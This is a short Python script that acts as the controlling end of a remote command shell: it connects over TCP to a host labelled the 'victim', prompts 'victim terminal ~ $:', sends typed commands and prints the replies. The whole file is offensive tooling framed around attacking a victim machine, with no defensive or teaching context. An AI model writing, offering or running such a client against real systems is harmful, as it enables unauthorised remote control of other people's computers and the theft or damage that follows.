import socket
import sys

def real(HOST, PORT):
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((HOST,PORT))
		except:
			print("connection refused: wrong victim ip")
			break

		command = input("victim terminal ~ $: ")
		if command == "exit()":
			return False
			break
		else:
			s.sendall(command.encode())

			result = s.recv(1024)
			print("\n" + result.decode())
